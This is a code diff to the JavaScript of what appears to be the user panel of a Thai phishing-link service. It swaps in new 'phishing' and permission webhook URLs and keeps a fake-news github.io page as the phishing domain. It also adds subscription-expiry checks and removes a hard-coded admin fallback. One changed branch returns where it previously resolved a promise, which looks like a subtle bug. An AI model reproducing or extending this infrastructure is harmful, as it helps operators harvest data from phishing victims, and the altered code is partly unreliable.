@@ -741,8 +741,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbz-1RH4TMqxGs8IP5J9InYVUMdVqsDVxtw_e1M3z1Ry0Q6FH4CllvCDfPQhl4y8DG_w/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbz-1RH4TMqxGs8IP5J9InYVUMdVqsDVxtw_e1M3z1Ry0Q6FH4CllvCDfPQhl4y8DG_w/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -821,17 +821,32 @@
                 const originalText = statusEl.textContent;
                 statusEl.textContent = "กำลังตรวจสอบสิทธิ์...";
                 
-                // ตรวจสอบใน localStorage ก่อนว่าเคยตรวจสอบสิทธิ์แล้วหรือไม่ (ภายใน 30 นาที)
+                // ตรวจสอบใน localStorage ก่อนว่าเคยตรวจสอบสิทธิ์แล้วหรือไม่ (ภายใน 15 นาที)
                 try {
                     const savedPermission = localStorage.getItem('user_permission_' + userId);
                     const savedTime = parseInt(localStorage.getItem('user_permission_time_' + userId) || '0');
                     const currentTime = new Date().getTime();
                     
-                    // ถ้าข้อมูลไม่เกิน 15 นาที ให้ใช้ค่าจาก localStorage (ลดจาก 30 นาที เหลือ 15 นาที)
+                    // ถ้าข้อมูลไม่เกิน 15 นาที ให้ใช้ค่าจาก localStorage (ลดจาก 30 นาทีเหลือ 15 นาที)
                     if (savedPermission && (currentTime - savedTime < 15 * 60 * 1000)) {
                         console.log("ใช้ข้อมูลสิทธิ์จาก localStorage");
                         statusEl.textContent = originalText;
-                        return resolve(savedPermission === 'true');
+                        
+                        // แสดงวันหมดอายุถ้ามี
+                        const savedExpirationDate = localStorage.getItem('user_expiration_' + userId);
+                        if (savedExpirationDate) {
+                            displayExpirationDate(savedExpirationDate);
+                        }
+                        
+                        // ตรวจสอบสถานะการหมดอายุ
+                        const isExpired = localStorage.getItem('user_expired_' + userId) === 'true';
+                        if (isExpired) {
+                            console.log("ผู้ใช้หมดอายุการใช้งาน (จาก localStorage)");
+                            statusEl.textContent = "หมดอายุการใช้งาน";
+                            return false;
+                        }
+                        
+                        return savedPermission === 'true';
                     }
                 } catch (e) {
                     console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
@@ -850,6 +865,32 @@
                         if (data && typeof data === 'object') {
                             console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
                             console.log("ข้อความสถานะจาก API:", data.userStatus || "ไม่ได้ระบุ");
+                            console.log("วันหมดอายุจาก API:", data.expirationDate || "ไม่ได้ระบุ");
+                            console.log("สถานะการหมดอายุจาก API:", data.expired ? "หมดอายุ" : "ยังไม่หมดอายุ");
+                            
+                            // แสดงวันหมดอายุการใช้งานถ้ามี
+                            if (data.expirationDate) {
+                                displayExpirationDate(data.expirationDate);
+                                // บันทึกวันหมดอายุใน localStorage
+                                try {
+                                    localStorage.setItem('user_expiration_' + userId, data.expirationDate);
+                                } catch (e) {
+                                    console.error('ไม่สามารถบันทึกวันหมดอายุใน localStorage:', e);
+                                }
+                            }
+                            
+                            // ตรวจสอบสถานะการหมดอายุ
+                            const isExpired = data.expired === true;
+                            try {
+                                localStorage.setItem('user_expired_' + userId, isExpired ? 'true' : 'false');
+                            } catch (e) {
+                                console.error('ไม่สามารถบันทึกสถานะการหมดอายุใน localStorage:', e);
+                            }
+                            
+                            // Update status text based on API response
+                            if (data.userStatus) {
+                                statusEl.textContent = data.userStatus;
+                            }
                             
                             // บันทึกสิทธิ์ใน localStorage
                             try {
@@ -864,17 +905,13 @@
                             }
                             
                             if (data.hasPermission !== undefined) {
-                                // คืนค่าข้อความเดิม
-                                statusEl.textContent = originalText;
                                 resolve(data.hasPermission === true);
                             } else {
                                 console.log("ข้อมูลสิทธิ์ไม่สมบูรณ์, ใช้การตรวจสอบสำรอง");
-                                statusEl.textContent = originalText;
                                 resolve(checkUserPermissionFallback(userId));
                             }
                         } else {
                             console.log("ข้อมูลสิทธิ์ไม่ถูกต้อง, ใช้การตรวจสอบสำรอง");
-                            statusEl.textContent = originalText;
                             resolve(checkUserPermissionFallback(userId));
                         }
                         
@@ -934,54 +971,162 @@
             }
         }
 
-        // ตรวจสอบสิทธิ์แบบสำรอง - ปรับปรุงให้เข้มงวดขึ้น
-        function checkUserPermissionFallback(userId) {
-            console.log("ใช้การตรวจสอบสิทธิ์แบบสำรอง");
+        // ฟังก์ชันใหม่: แสดงวันหมดอายุการใช้งาน
+        function displayExpirationDate(expirationDate) {
+            if (!expirationDate) return;
             
-            // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์เข้าใช้งาน (ใช้เฉพาะกรณีฉุกเฉิน)
-            const approvedUserIds = [
-                'U69aa2cb90c9f40291278c346c50dc021', // ไอดีผู้ดูแลระบบ
-                // ในกรณีฉุกเฉินให้เพิ่มไอดีของผู้ใช้ที่ได้รับอนุมัติแล้วในนี้
-                // 'UxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAA', // ชื่อผู้ใช้ 1
-                // 'UxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBB', // ชื่อผู้ใช้ 2
-                // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์คนอื่นๆ ตามความเหมาะสม
-            ];
+            console.log("กำลังแสดงวันหมดอายุ:", expirationDate);
             
-            // ตรวจสอบว่าเป็น admin หรือไม่โดยตรง
-            if (userId === 'U69aa2cb90c9f40291278c346c50dc021') {
-                console.log("ผู้ใช้คือผู้ดูแลระบบ อนุญาตให้เข้าใช้งาน");
-                return true;
+            // ตรวจสอบว่ามีวันหมดอายุหรือไม่
+            if (expirationDate.trim() === "") {
+                console.log("ไม่มีวันหมดอายุกำหนด");
+                return;
             }
             
-            // เพิ่มการตรวจสอบใน localStorage กรณีที่เคยมีการบันทึกไว้แล้ว
-            try {
-                const savedPermission = localStorage.getItem('user_permission_' + userId);
-                if (savedPermission === 'true') {
-                    console.log("ใช้ข้อมูลสิทธิ์จาก localStorage (กรณี fallback): ได้รับอนุมัติ");
-                    return true;
-                } else if (savedPermission === 'false') {
-                    console.log("ใช้ข้อมูลสิทธิ์จาก localStorage (กรณี fallback): ไม่ได้รับอนุมัติ");
-                    return false;
+            // ตรวจสอบว่าแสดงวันหมดอายุแล้วหรือยัง
+            let expirationElement = document.getElementById('expirationDate');
+            if (!expirationElement) {
+                // สร้าง element ใหม่
+                expirationElement = document.createElement('div');
+                expirationElement.id = 'expirationDate';
+                expirationElement.className = 'user-expiration';
+                
+                // เพิ่ม CSS สำหรับส่วนแสดงวันหมดอายุ
+                const style = document.createElement('style');
+                style.textContent = `
+                    .user-expiration {
+                        font-size: 13px;
+                        color: #777;
+                        margin-top: 5px;
+                        padding-left: 5px;
+                        display: flex;
+                        align-items: center;
+                    }
+                    .user-expiration i {
+                        margin-right: 5px;
+                        color: var(--primary-color);
+                    }
+                    .expire-warning {
+                        color: var(--warning-color);
+                    }
+                    .expire-danger {
+                        color: var(--error-color);
+                    }
+                `;
+                document.head.appendChild(style);
+                
+                // หาตำแหน่งที่จะแทรก
+                const userStatusElement = document.querySelector('.user-status');
+                if (userStatusElement) {
+                    userStatusElement.parentNode.appendChild(expirationElement);
                 }
-            } catch (e) {
-                console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
             }
             
-            // ในกรณีที่ไม่มีข้อมูลใน localStorage ให้ตรวจสอบจากรายชื่อที่กำหนดไว้
-            const hasAccess = approvedUserIds.includes(userId);
-            console.log(`ผู้ใช้ ${userId} ${hasAccess ? 'มี' : 'ไม่มี'}สิทธิ์เข้าใช้งานจากรายชื่อสำรอง`);
+            // ตรวจสอบการหมดอายุ
+            const isExpired = checkExpiration(expirationDate);
+            const daysLeft = getDaysLeft(expirationDate);
             
-            // บันทึกการตรวจสอบนี้ไว้ใน localStorage เพื่อลดการเรียกใช้งานซ้ำ
-            try {
-                localStorage.setItem('user_permission_' + userId, hasAccess ? 'true' : 'false');
-                localStorage.setItem('user_permission_time_' + userId, new Date().getTime().toString());
-            } catch (e) {
-                console.error('ไม่สามารถบันทึกข้อมูลใน localStorage:', e);
+            let expirationClass = "";
+            if (isExpired) {
+                expirationClass = "expire-danger";
+            } else if (daysLeft <= 7) {
+                expirationClass = "expire-warning";
             }
             
-            return hasAccess;
+            // กำหนดข้อความวันหมดอายุ
+            if (isExpired) {
+                expirationElement.innerHTML = `<i class="fas fa-clock"></i> <span class="${expirationClass}">หมดอายุการใช้งานแล้ว (${expirationDate})</span>`;
+            } else if (daysLeft <= 7) {
+                expirationElement.innerHTML = `<i class="fas fa-clock"></i> <span class="${expirationClass}">จะหมดอายุใน ${daysLeft} วัน (${expirationDate})</span>`;
+            } else {
+                expirationElement.innerHTML = `<i class="fas fa-clock"></i> <span>หมดอายุ: ${expirationDate}</span>`;
+            }
         }
         
+        // ฟังก์ชันตรวจสอบการหมดอายุ
+        function checkExpiration(expirationDate) {
+            if (!expirationDate) return false;
+            
+            try {
+                // ตรวจสอบรูปแบบวันที่ DD/MM/YYYY HH:MM:SS
+                const regexPattern = /^(\d{1,2})\/(\d{1,2})\/(\d{4})\s+(\d{1,2}):(\d{1,2}):(\d{1,2})$/;
+                const match = expirationDate.match(regexPattern);
+                
+                if (!match) return false;
+                
+                // แยกส่วนประกอบของวันที่
+                const day = parseInt(match[1], 10);
+                const month = parseInt(match[2], 10) - 1; // เดือนใน JavaScript เริ่มจาก 0
+                let year = parseInt(match[3], 10);
+                
+                // แปลงปี พ.ศ. เป็น ค.ศ. ถ้าจำเป็น
+                if (year > 2500) {
+                    year = year - 543;
+                }
+                
+                const hour = parseInt(match[4], 10);
+                const minute = parseInt(match[5], 10);
+                const second = parseInt(match[6], 10);
+                
+                // สร้างวัตถุ Date
+                const expirationDateTime = new Date(year, month, day, hour, minute, second);
+                const currentDate = new Date();
+                
+                // เปรียบเทียบวันที่
+                return currentDate > expirationDateTime;
+                
+            } catch (error) {
+                console.error('เกิดข้อผิดพลาดในการตรวจสอบวันหมดอายุ:', error);
+                return false;
+            }
+        }
+        
+        // ฟังก์ชันคำนวณจำนวนวันที่เหลือก่อนหมดอายุ
+        function getDaysLeft(expirationDate) {
+            if (!expirationDate) return 0;
+            
+            try {
+                // ตรวจสอบรูปแบบวันที่ DD/MM/YYYY HH:MM:SS
+                const regexPattern = /^(\d{1,2})\/(\d{1,2})\/(\d{4})\s+(\d{1,2}):(\d{1,2}):(\d{1,2})$/;
+                const match = expirationDate.match(regexPattern);
+                
+                if (!match) return 0;
+                
+                // แยกส่วนประกอบของวันที่
+                const day = parseInt(match[1], 10);
+                const month = parseInt(match[2], 10) - 1; // เดือนใน JavaScript เริ่มจาก 0
+                let year = parseInt(match[3], 10);
+                
+                // แปลงปี พ.ศ. เป็น ค.ศ. ถ้าจำเป็น
+                if (year > 2500) {
+                    year = year - 543;
+                }
+                
+                const hour = parseInt(match[4], 10);
+                const minute = parseInt(match[5], 10);
+                const second = parseInt(match[6], 10);
+                
+                // สร้างวัตถุ Date
+                const expirationDateTime = new Date(year, month, day, hour, minute, second);
+                const currentDate = new Date();
+                
+                // เปรียบเทียบวันที่
+                if (currentDate > expirationDateTime) {
+                    return 0; // หมดอายุแล้ว
+                }
+                
+                // คำนวณจำนวนวันที่เหลือ
+                const diffTime = expirationDateTime.getTime() - currentDate.getTime();
+                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+                
+                return diffDays;
+                
+            } catch (error) {
+                console.error('เกิดข้อผิดพลาดในการคำนวณวันที่เหลือ:', error);
+                return 0;
+            }
+        }
+
         // เปิดใช้งานฟอร์ม
         function enableForm() {
             document.getElementById('caseName').disabled = false;
